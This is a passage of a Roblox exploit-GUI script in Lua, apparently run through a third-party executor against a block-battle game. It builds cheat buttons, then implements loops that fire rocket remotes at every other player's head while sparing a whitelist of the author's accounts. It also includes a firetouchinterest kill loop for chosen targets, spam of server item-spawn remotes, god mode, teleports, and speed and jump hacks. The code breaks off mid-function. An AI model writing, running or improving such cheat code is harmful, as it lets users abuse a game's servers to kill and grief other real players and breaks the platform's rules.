			Next1.Parent = MainFrame
			Next1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Next1.Position = UDim2.new(0.909356713, 0, 0.364685416, 0)
			Next1.Size = UDim2.new(0, 31, 0, 52)
			Next1.Style = Enum.ButtonStyle.RobloxRoundButton
			Next1.Font = Enum.Font.SourceSansLight
			Next1.Text = "Next"
			Next1.TextColor3 = Color3.fromRGB(0, 0, 0)
			Next1.TextSize = 14.000
	
			Prev1.Name = "Prev1"
			Prev1.Parent = MainFrame
			Prev1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Prev1.Position = UDim2.new(-0.00584803894, 0, 0.340145528, 0)
			Prev1.Size = UDim2.new(0, 31, 0, 52)
			Prev1.Visible = false
			Prev1.Style = Enum.ButtonStyle.RobloxRoundButton
			Prev1.Font = Enum.Font.SourceSansLight
			Prev1.Text = "Prev"
			Prev1.TextColor3 = Color3.fromRGB(0, 0, 0)
			Prev1.TextSize = 14.000
	
			Next2.Name = "Next2"
			Next2.Parent = MainFrame
			Next2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Next2.Position = UDim2.new(0.908999979, 0, 0.36500001, 0)
			Next2.Size = UDim2.new(0, 31, 0, 52)
			Next2.Visible = false
			Next2.Style = Enum.ButtonStyle.RobloxRoundButton
			Next2.Font = Enum.Font.SourceSansLight
			Next2.Text = "Next"
			Next2.TextColor3 = Color3.fromRGB(0, 0, 0)
			Next2.TextSize = 14.000
	
			Prev2.Name = "Prev2"
			Prev2.Parent = MainFrame
			Prev2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Prev2.Position = UDim2.new(-0.00600000005, 0, 0.340000004, 0)
			Prev2.Size = UDim2.new(0, 31, 0, 52)
			Prev2.Visible = false
			Prev2.Style = Enum.ButtonStyle.RobloxRoundButton
			Prev2.Font = Enum.Font.SourceSansLight
			Prev2.Text = "Prev"
			Prev2.TextColor3 = Color3.fromRGB(0, 0, 0)
			Prev2.TextSize = 14.000
	
			Page3Frame.Name = "Page3Frame"
			Page3Frame.Parent = MainFrame
			Page3Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
			Page3Frame.Position = UDim2.new(0.0860000029, 0, 0, 0)
			Page3Frame.Size = UDim2.new(0, 282, 0, 163)
			Page3Frame.Visible = false
	
			Page3.Name = "Page 3"
			Page3.Parent = Page3Frame
			Page3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Page3.BackgroundTransparency = 1.000
			Page3.Position = UDim2.new(0.273049712, 0, 0.801993728, 0)
			Page3.Size = UDim2.new(0, 128, 0, 37)
			Page3.Font = Enum.Font.SourceSansItalic
			Page3.Text = "Page 3"
			Page3.TextColor3 = Color3.fromRGB(255, 255, 255)
			Page3.TextSize = 14.000
	
			InfiniteJump.Name = "InfiniteJump"
			InfiniteJump.Parent = Page3Frame
			InfiniteJump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			InfiniteJump.Size = UDim2.new(0, 57, 0, 57)
			InfiniteJump.Style = Enum.ButtonStyle.RobloxRoundButton
			InfiniteJump.Font = Enum.Font.SourceSansLight
			InfiniteJump.Text = "InfJump"
			InfiniteJump.TextColor3 = Color3.fromRGB(0, 0, 0)
			InfiniteJump.TextSize = 14.000
	
			Invis.Name = "Invis"
			Invis.Parent = Page3Frame
			Invis.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Invis.Position = UDim2.new(0.797872365, 0, 0, 0)
			Invis.Size = UDim2.new(0, 57, 0, 57)
			Invis.Style = Enum.ButtonStyle.RobloxRoundButton
			Invis.Font = Enum.Font.SourceSansLight
			Invis.Text = "Invis"
			Invis.TextColor3 = Color3.fromRGB(0, 0, 0)
			Invis.TextSize = 14.000
	
			Requires.Name = "Requires"
			Requires.Parent = Page3Frame
			Requires.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Requires.BackgroundTransparency = 1.000
			Requires.Position = UDim2.new(0.762411475, 0, 0.349693239, 0)
			Requires.Size = UDim2.new(0, 75, 0, 22)
			Requires.Font = Enum.Font.SourceSansLight
			Requires.Text = "Requires Invis Cape"
			Requires.TextColor3 = Color3.fromRGB(255, 255, 255)
			Requires.TextScaled = true
			Requires.TextSize = 14.000
			Requires.TextWrapped = true
	
			AirWalk.Name = "AirWalk"
			AirWalk.Parent = Page3Frame
			AirWalk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			AirWalk.Position = UDim2.new(0.202127695, 0, 0, 0)
			AirWalk.Size = UDim2.new(0, 57, 0, 57)
			AirWalk.Style = Enum.ButtonStyle.RobloxRoundButton
			AirWalk.Font = Enum.Font.SourceSansLight
			AirWalk.Text = "AirWalk"
			AirWalk.TextColor3 = Color3.fromRGB(0, 0, 0)
			AirWalk.TextSize = 14.000
	
			UnAirWalk.Name = "UnAirWalk"
			UnAirWalk.Parent = Page3Frame
			UnAirWalk.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnAirWalk.Position = UDim2.new(0.202127695, 0, 0, 0)
			UnAirWalk.Size = UDim2.new(0, 57, 0, 57)
			UnAirWalk.Visible = false
			UnAirWalk.Style = Enum.ButtonStyle.RobloxRoundButton
			UnAirWalk.Font = Enum.Font.SourceSansLight
			UnAirWalk.Text = "UnAirWalk"
			UnAirWalk.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnAirWalk.TextSize = 14.000
	
			ClickTP.Name = "ClickTP"
			ClickTP.Parent = Page3Frame
			ClickTP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ClickTP.Position = UDim2.new(0.40425536, 0, 0, 0)
			ClickTP.Size = UDim2.new(0, 57, 0, 57)
			ClickTP.Style = Enum.ButtonStyle.RobloxRoundButton
			ClickTP.Font = Enum.Font.SourceSansLight
			ClickTP.Text = "ClickTP"
			ClickTP.TextColor3 = Color3.fromRGB(0, 0, 0)
			ClickTP.TextSize = 14.000
	
			Crash.Name = "Crash"
			Crash.Parent = Page3Frame
			Crash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Crash.Position = UDim2.new(0.602836907, 0, 0, 0)
			Crash.Size = UDim2.new(0, 57, 0, 57)
			Crash.Style = Enum.ButtonStyle.RobloxRoundButton
			Crash.Font = Enum.Font.SourceSansLight
			Crash.Text = "Crash"
			Crash.TextColor3 = Color3.fromRGB(0, 0, 0)
			Crash.TextSize = 14.000
	
			Patience.Name = "Patience"
			Patience.Parent = Page3Frame
			Patience.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Patience.BackgroundTransparency = 1.000
			Patience.Position = UDim2.new(0.613475204, 0, 0.346280515, 0)
			Patience.Size = UDim2.new(0, 51, 0, 34)
			Patience.Font = Enum.Font.SourceSansLight
			Patience.Text = "This Script takes a while be patient"
			Patience.TextColor3 = Color3.fromRGB(255, 255, 255)
			Patience.TextScaled = true
			Patience.TextSize = 14.000
			Patience.TextWrapped = true
	
			T.Name = "T"
			T.Parent = Page3Frame
			T.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			T.BackgroundTransparency = 1.000
			T.Position = UDim2.new(0.439716309, 0, 0.361963183, 0)
			T.Size = UDim2.new(0, 33, 0, 27)
			T.Font = Enum.Font.SourceSansLight
			T.Text = "Ctrl + L to TP"
			T.TextColor3 = Color3.fromRGB(255, 255, 255)
			T.TextScaled = true
			T.TextSize = 14.000
			T.TextWrapped = true
	
			Control.Name = "Control"
			Control.Parent = Page3Frame
			Control.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Control.BackgroundTransparency = 1.000
			Control.Position = UDim2.new(0.202127665, 0, 0.361963212, 0)
			Control.Size = UDim2.new(0, 57, 0, 20)
			Control.Font = Enum.Font.SourceSansLight
			Control.Text = "Press Ctrl to go down"
			Control.TextColor3 = Color3.fromRGB(255, 255, 255)
			Control.TextScaled = true
			Control.TextSize = 14.000
			Control.TextWrapped = true
	
			Untoggleable.Name = "Untoggleable"
			Untoggleable.Parent = Page3Frame
			Untoggleable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Untoggleable.BackgroundTransparency = 1.000
			Untoggleable.Position = UDim2.new(0.0212765969, 0, 0.346280515, 0)
			Untoggleable.Size = UDim2.new(0, 45, 0, 30)
			Untoggleable.Font = Enum.Font.SourceSansLight
			Untoggleable.Text = "This is not untoggleable"
			Untoggleable.TextColor3 = Color3.fromRGB(255, 255, 255)
			Untoggleable.TextScaled = true
			Untoggleable.TextSize = 14.000
			Untoggleable.TextWrapped = true
	
			ToVoid.Name = "ToVoid"
			ToVoid.Parent = Page3Frame
			ToVoid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ToVoid.Position = UDim2.new(0, 0, 0.527607381, 0)
			ToVoid.Size = UDim2.new(0, 57, 0, 57)
			ToVoid.Style = Enum.ButtonStyle.RobloxRoundButton
			ToVoid.Font = Enum.Font.SourceSansLight
			ToVoid.Text = "ToVoid"
			ToVoid.TextColor3 = Color3.fromRGB(0, 0, 0)
			ToVoid.TextSize = 14.000
	
			Reset.Name = "Reset"
			Reset.Parent = Page3Frame
			Reset.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Reset.BackgroundTransparency = 1.000
			Reset.Position = UDim2.new(0.0212766007, 0, 0.824808121, 0)
			Reset.Size = UDim2.new(0, 46, 0, 29)
			Reset.Font = Enum.Font.SourceSansLight
			Reset.Text = "Reset to go back to map"
			Reset.TextColor3 = Color3.fromRGB(255, 255, 255)
			Reset.TextScaled = true
			Reset.TextSize = 14.000
			Reset.TextWrapped = true
	
			UnToVoid.Name = "UnToVoid"
			UnToVoid.Parent = Page3Frame
			UnToVoid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnToVoid.Position = UDim2.new(0, 0, 0.527607381, 0)
			UnToVoid.Size = UDim2.new(0, 57, 0, 57)
			UnToVoid.Visible = false
			UnToVoid.Style = Enum.ButtonStyle.RobloxRoundButton
			UnToVoid.Font = Enum.Font.SourceSansLight
			UnToVoid.Text = "UnToVoid"
			UnToVoid.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnToVoid.TextSize = 14.000
	
			KillHits.Name = "KillHits"
			KillHits.Parent = Page3Frame
			KillHits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			KillHits.Position = UDim2.new(0.202127665, 0, 0.527607381, 0)
			KillHits.Size = UDim2.new(0, 57, 0, 57)
			KillHits.Style = Enum.ButtonStyle.RobloxRoundButton
			KillHits.Font = Enum.Font.SourceSansLight
			KillHits.Text = "KillHits"
			KillHits.TextColor3 = Color3.fromRGB(0, 0, 0)
			KillHits.TextSize = 14.000
	
			UnKillHits.Name = "UnKillHits"
			UnKillHits.Parent = Page3Frame
			UnKillHits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnKillHits.Position = UDim2.new(0.202127665, 0, 0.527607381, 0)
			UnKillHits.Size = UDim2.new(0, 57, 0, 57)
			UnKillHits.Visible = false
			UnKillHits.Style = Enum.ButtonStyle.RobloxRoundButton
			UnKillHits.Font = Enum.Font.SourceSansLight
			UnKillHits.Text = "UnKillHits"
			UnKillHits.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnKillHits.TextSize = 14.000
	
			CharacterRemove.Name = "CharacterRemove"
			CharacterRemove.Parent = Page3Frame
			CharacterRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			CharacterRemove.Position = UDim2.new(0.404255331, 0, 0.527607381, 0)
			CharacterRemove.Size = UDim2.new(0, 57, 0, 57)
			CharacterRemove.Style = Enum.ButtonStyle.RobloxRoundButton
			CharacterRemove.Font = Enum.Font.SourceSansLight
			CharacterRemove.Text = "DeleteMe"
			CharacterRemove.TextColor3 = Color3.fromRGB(0, 0, 0)
			CharacterRemove.TextSize = 14.000
	
			UnCharacterRemove.Name = "UnCharacterRemove"
			UnCharacterRemove.Parent = Page3Frame
			UnCharacterRemove.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnCharacterRemove.Position = UDim2.new(0.404255331, 0, 0.527607381, 0)
			UnCharacterRemove.Size = UDim2.new(0, 57, 0, 57)
			UnCharacterRemove.Visible = false
			UnCharacterRemove.Style = Enum.ButtonStyle.RobloxRoundButton
			UnCharacterRemove.Font = Enum.Font.SourceSansLight
			UnCharacterRemove.Text = "Reset"
			UnCharacterRemove.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnCharacterRemove.TextSize = 14.000
	
			AntiCrash.Name = "AntiCrash"
			AntiCrash.Parent = Page3Frame
			AntiCrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			AntiCrash.Position = UDim2.new(0.602836847, 0, 0.527607381, 0)
			AntiCrash.Size = UDim2.new(0, 57, 0, 57)
			AntiCrash.Style = Enum.ButtonStyle.RobloxRoundButton
			AntiCrash.Font = Enum.Font.SourceSansLight
			AntiCrash.Text = "AntiCrash"
			AntiCrash.TextColor3 = Color3.fromRGB(0, 0, 0)
			AntiCrash.TextSize = 14.000
	
			UnAntiCrash.Name = "UnAntiCrash"
			UnAntiCrash.Parent = Page3Frame
			UnAntiCrash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnAntiCrash.Position = UDim2.new(0.602836847, 0, 0.527607381, 0)
			UnAntiCrash.Size = UDim2.new(0, 57, 0, 57)
			UnAntiCrash.Visible = false
			UnAntiCrash.Style = Enum.ButtonStyle.RobloxRoundButton
			UnAntiCrash.Font = Enum.Font.SourceSansLight
			UnAntiCrash.Text = "UnAntiCrash"
			UnAntiCrash.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnAntiCrash.TextSize = 14.000
	
			KrnlCbring.Name = "KrnlCbring"
			KrnlCbring.Parent = Page3Frame
			KrnlCbring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			KrnlCbring.Position = UDim2.new(0.797872305, 0, 0.527607381, 0)
			KrnlCbring.Size = UDim2.new(0, 57, 0, 57)
			KrnlCbring.Style = Enum.ButtonStyle.RobloxRoundButton
			KrnlCbring.Font = Enum.Font.SourceSansLight
			KrnlCbring.Text = "Cbring"
			KrnlCbring.TextColor3 = Color3.fromRGB(0, 0, 0)
			KrnlCbring.TextSize = 14.000
	
			UnKrnlCbring.Name = "UnKrnlCbring"
			UnKrnlCbring.Parent = Page3Frame
			UnKrnlCbring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnKrnlCbring.Position = UDim2.new(0.797872305, 0, 0.527607381, 0)
			UnKrnlCbring.Size = UDim2.new(0, 57, 0, 57)
			UnKrnlCbring.Visible = false
			UnKrnlCbring.Style = Enum.ButtonStyle.RobloxRoundButton
			UnKrnlCbring.Font = Enum.Font.SourceSansLight
			UnKrnlCbring.Text = "UnCbring"
			UnKrnlCbring.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnKrnlCbring.TextSize = 14.000
	
			ThanksRyan.Name = "ThanksRyan"
			ThanksRyan.Parent = LBBGui
			ThanksRyan.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			ThanksRyan.Position = UDim2.new(0.243362829, 0, 0.337883949, 0)
			ThanksRyan.Size = UDim2.new(0, 695, 0, 284)
			ThanksRyan.Visible = false
	
			TextLabel_2.Parent = ThanksRyan
			TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel_2.BackgroundTransparency = 1.000
			TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
			TextLabel_2.Position = UDim2.new(0.178417265, 0, 0.225352108, 0)
			TextLabel_2.Size = UDim2.new(0, 447, 0, 156)
			TextLabel_2.Font = Enum.Font.FredokaOne
			TextLabel_2.Text = "Thank you biel For Contributing on my Gui and using it. i'm gay"
			TextLabel_2.TextColor3 = Color3.fromRGB(218, 48, 80)
			TextLabel_2.TextScaled = true
			TextLabel_2.TextSize = 14.000
			TextLabel_2.TextWrapped = true
	
			XButton.Name = "XButton"
			XButton.Parent = ThanksRyan
			XButton.BackgroundColor3 = Color3.fromRGB(140, 27, 44)
			XButton.Position = UDim2.new(0.952517986, 0, 0, 0)
			XButton.Size = UDim2.new(0, 33, 0, 24)
			XButton.Font = Enum.Font.SourceSans
			XButton.Text = "X"
			XButton.TextColor3 = Color3.fromRGB(0, 0, 0)
			XButton.TextScaled = true
			XButton.TextSize = 14.000
			XButton.TextWrapped = true
	
			UICorner.Parent = XButton
	
			UICorner_2.Parent = ThanksRyan
	
			-- Scripts:
	
			local function CNJMHJX_fake_script() -- LBBGui.Script 
				local script = Instance.new('Script', LBBGui)
	
				--previoustable
				local previous = {}
	
				--safetable
				local Safe = {"bielsamorim1", "BubbaGumpWasTaken"}
	
				--targetsTable
				local Targets = {}
	
				--Special for Ryan
				if game.Players.LocalPlayer.Name == "bielsamorim1" then
					ThanksRyan.Visible = true
				end
	
				--XButton
				XButton.MouseButton1Down:connect(function()
					ThanksRyan.Visible = false
				end)
	
				--frame
				frame = script.Parent.DragFrame
				frame.Draggable = true
				frame.Active = true
				frame.Selectable = true
	
				--startmessage
				game.StarterGui:SetCore("ChatMakeSystemMessage", {
					Text = "Thank you for using my Gui\nAdded:\nNew Cbring for NonSynapse\n Credits:\n/kevim";
					Color = Color3.fromRGB(255,143,223);
					Font = Enum.Font.SourceSansBold;
					FontSize = Enum.FontSize.Size96;
				})
	
				--block
				local Block = Instance.new("Part", workspace)
				Block.Name = "PlatformBlock"
				Block.Position = Vector3.new(300000, 300000, 300000)
				Block.Size = Vector3.new(10000, 3, 10000)
				Block.BrickColor = BrickColor.Random()
				Block.CanCollide = true
				Block.Anchored = true
	
				--cbring
				CBRING.MouseButton1Down:connect(function()
					_G.Cbring = true
	
					while _G.Cbring == true do
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i, v in pairs(game.Players:GetChildren()) do
								if v ~= game.Players.LocalPlayer and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" and v.Name ~= "bielsamorimban" and v.Name ~= "BubbaGumpWasTaken" then
									if v.Character.Humanoid.Health > 0 then
										game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),v.Character.Head.Position)
									end
								end
							end
						end)
					end
				end)
				CBRING.MouseButton1Down:connect(function()
					OFF.Visible = true
					CBRING.Visible = false
				end)
	
				--rocket
				Rocket.MouseButton1Down:connect(function()
					_G.Activate = true
	
					repeat 
						game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
						game:GetService("RunService").RenderStepped:wait()
					until game.Players.LocalPlayer.Backpack:FindFirstChild("RocketJumper")
	
					while _G.Activate do
						wait()
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.VoidGiver.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverRainbow2.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverRainbow1.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverGalaxy1.ColoredParts.TouchMe.Position)
						game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Workspace.CenterBlocks.Givers.BlockGiverGalaxy2.ColoredParts.TouchMe.Position)
					end
				end)
				Rocket.MouseButton1Down:connect(function()
					UnRocket.Visible = true
					Rocket.Visible = false
				end)
	
				--uncbring
				OFF.MouseButton1Down:connect(function()
					OFF.Visible = false
					CBRING.Visible = true
					_G.Cbring = false
				end)
	
				--unrocket
				UnRocket.MouseButton1Down:connect(function()
					UnRocket.Visible = false
					Rocket.Visible = true
					_G.Activate = false
				end)
	
				--getgear
				GetGear.MouseButton1Down:connect(function()
					_G.OpenBlocks = true
	
					while _G.OpenBlocks == true do
						wait()
						game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
						game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
					end
				end)
	
				--TPtomid
				TP.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1041, 194, 90)
				end)
	
				--name
				Name:GetPropertyChangedSignal("Text"):Connect(function()
					for i = 1, #game.Players:GetPlayers() do
						if string.lower(string.sub(game.Players:GetPlayers()[i].Name, 1, string.len(Name.Text))) == string.lower(Name.Text) then
							Target = game.Players:GetPlayers()[i].Name
							break
						end
					end
				end)
	
				--toplr
				ToPlr.MouseButton1Down:connect(function()
					local PlayerName = Target
					local plr = game.Workspace:FindFirstChild(PlayerName)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = plr.HumanoidRootPart.CFrame * CFrame.new(-1,0,1)
				end)
	
				--rockettarget
				RocketTarget.MouseButton1Down:connect(function()
					_G.RocketTarget = true
					while _G.RocketTarget do
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i,v in pairs(game.Players:GetChildren()) do
								if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" then
									if game.Players:FindFirstChild(v.Name) then
										if game.Players:FindFirstChild(v.Name).Character.Humanoid.Health >= 1 then
											game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Players:FindFirstChild(v.Name).Character.Head.Position)
										end
									end
								end
							end
						end)
					end
				end)
	
	
	
				RocketTarget.MouseButton1Down:connect(function()
					RocketTarget.Visible = false
					UnRocketTarget.Visible = true
				end)
	
				--unrockettarget
				UnRocketTarget.MouseButton1Down:connect(function()
					_G.RocketTarget = false
				end)
				UnRocketTarget.MouseButton1Down:connect(function()
					RocketTarget.Visible = true
					UnRocketTarget.Visible = false
				end)
	
				--killtarget
				KillTarget.MouseButton1Down:connect(function()
					_G.KillTarget = true
					while _G.KillTarget == true do
						game:GetService("RunService").RenderStepped:wait()
						for i,v in pairs(game.Players:GetChildren()) do
							if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer and v.Name ~= "Zanonner" and v.Name ~= "BubbaGumpWasTaken" then
								spawn(function()
									local Handle = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle
									if Handle then
										for i,c in pairs(v.Character:GetChildren()) do
											if c:IsA("BasePart") then
												c = ((c.IsA(c, "BasePart") and firetouchinterest(Handle, c, 1,(game:GetService("RunService").RenderStepped.Wait(game:GetService("RunService").RenderStepped) and nil) or firetouchinterest(Handle, c, 0)) and nil) or c) or c
											end
										end
									end
								end)
							end
						end
					end
				end)
				KillTarget.MouseButton1Down:connect(function()
					KillTarget.Visible = false
					UnKillTarget.Visible = true
				end)
	
				--unkilltarget
				UnKillTarget.MouseButton1Down:connect(function()
					_G.KillTarget = false
				end)
				UnKillTarget.MouseButton1Down:connect(function()
					UnKillTarget.Visible = false
					KillTarget.Visible = true
				end)
	
				--regen
				Regen.MouseButton1Down:connect(function()
					local gearname2 = "TigerSkin"    
					repeat
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
					until game.Players.LocalPlayer.Backpack:FindFirstChild(gearname2)
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(game.Players.LocalPlayer.Backpack:WaitForChild("TigerSkin"))
					local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					mouse1click()
					wait()
					hum:UnequipTools()
					while game.RunService.RenderStepped:wait() do
						if hum and hum.Health <= 99 and hum.Health ~= 0 then
							if game.Players.LocalPlayer.Backpack:FindFirstChild("TigerSkin") then
								hum:EquipTool(game.Players.LocalPlayer.Backpack.TigerSkin)
								hum:UnequipTools()
							end
						end
					end
				end)
	
				--godmode
				GodMode.MouseButton1Down:connect(function()
					local gearname3 = "LockonLauncher"
					local gearname4 = "ChartreusePeriastron"
					local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
	
					repeat
						game:GetService("RunService").RenderStepped:wait()
						game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
					until game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3) and game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4)
	
					if game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3) and game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4) then
						game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4).Parent = game.Players.LocalPlayer.Character
						game:GetService("Players").LocalPlayer.Character.ChartreusePeriastron.Remote:FireServer(Enum.KeyCode.Q)
						wait(0.5)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,10,0)
						game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3).Parent = game.Players.LocalPlayer.Character
						game:GetService("Players").LocalPlayer.Character.LockonLauncher.Remote:FireServer(Vector3.new(-1172, 190, 201),Vector3.new(-1040, 195, 87))
					end
				end)
	
				--antiafk
				AntiAFK.MouseButton1Down:connect(function()
					local vu = game:GetService("VirtualUser")
					game:GetService("Players").LocalPlayer.Idled:connect(function()
						vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
						wait(1)
						vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
					end)
				end)
	
				--anchor
				Anchor.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
				end)
				Anchor.MouseButton1Down:connect(function()
					Anchor.Visible = false
					UnAnchor.Visible = true
				end)
	
				--unanchor
				UnAnchor.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				end)
				UnAnchor.MouseButton1Down:connect(function()
					Anchor.Visible = true
					UnAnchor.Visible = false
				end)
	
				--speed
				Speed.MouseButton1Down:connect(function()
					pcall(function()
						while true do
							game.RunService.RenderStepped:wait()
							for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
								if v.Name == "Humanoid" then
									v.WalkSpeed = WalkSpeed1.Text
								end
							end
						end
					end)
				end)
	
				--jump
				Jump.MouseButton1Down:connect(function()
					pcall(function()
						while true do
							game.RunService.RenderStepped:wait()
							for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
								if v.Name == "Humanoid" then
									v.JumpPower = JumpHeight.Text
								end
							end
						end
					end)
				end)
	
				--safespot
				SafeSpot.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(300000, 300001, 300000)
				end)
	
				--next1
				Next1.MouseButton1Down:connect(function()
					Page2Frame.Visible = true
					Page1Frame.Visible = false
					Prev1.Visible = true
					Next1.Visible = false
					Next2.Visible = true
				end)
	
				--prev1
				Prev1.MouseButton1Down:connect(function()
					Page2Frame.Visible = false
					Page1Frame.Visible = true
					Next1.Visible = true
					Prev1.Visible = false
					Next2.Visible = false
				end)
	
				--next2
				Next2.MouseButton1Down:connect(function()
					Page3Frame.Visible = true
					Page2Frame.Visible = false
					Prev2.Visible = true
					Next1.Visible = false
					Next2.Visible = false
					Prev1.Visible = false
				end)
	
				--prev2
				Prev2.MouseButton1Down:connect(function()
					Page3Frame.Visible = false
					Page2Frame.Visible = true
					Next2.Visible = true
					Prev2.Visible = false
					Prev1.Visible = true
				end)
	
				--infjump
				InfiniteJump.MouseButton1Down:connect(function()
					local function Jump()
						_G.Jump = game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
					end
	
					game.UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
						if input.UserInputType == Enum.UserInputType.Keyboard then
							if input.KeyCode == Enum.KeyCode.Space then
								Jump()
							end
						end
					end)
				end)
	
				--invis
				Invis.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(game.Players.LocalPlayer.Backpack:WaitForChild("TrololoCapeOfInvisibility"))
					local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
					mouse1click()
					wait(0.25)
					repeat
						game.RunService.RenderStepped:wait()
					until game.Players.LocalPlayer.Character.Torso.Transparency ~= 1
	
					hum:UnequipTools()
				end)
	
				--airwalk
				AirWalk.MouseButton1Down:connect(function()
					mouse = game.Players.LocalPlayer:GetMouse()
					_G.AirWalk = true
	
	
					local WalkPart = Instance.new("Part", workspace)
					WalkPart.Size = Vector3.new(7, 2, 3)
					WalkPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
					WalkPart.Transparency = 1
					WalkPart.Anchored = true
					WalkPart.Name = "Airwalk"
	
	
					mouse.KeyDown:Connect(function(key)
						if key == "2" then
							WalkPart.Size = Vector3.new(4, -0.5, 3)
						end
					end)
	
					mouse.KeyUp:Connect(function(key)
						if key == "2" then
							WalkPart.Size = Vector3.new(7, 2, 3)
						end
					end)
	
					repeat
						WalkPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
						wait()
					until _G.AirWalk == false
					WalkPart:Destroy()
				end)
				AirWalk.MouseButton1Down:connect(function()
					AirWalk.Visible = false
					UnAirWalk.Visible = true
				end)
	
				--unairwalk
				UnAirWalk.MouseButton1Down:connect(function()
					_G.AirWalk = false
				end)
				UnAirWalk.MouseButton1Down:connect(function()
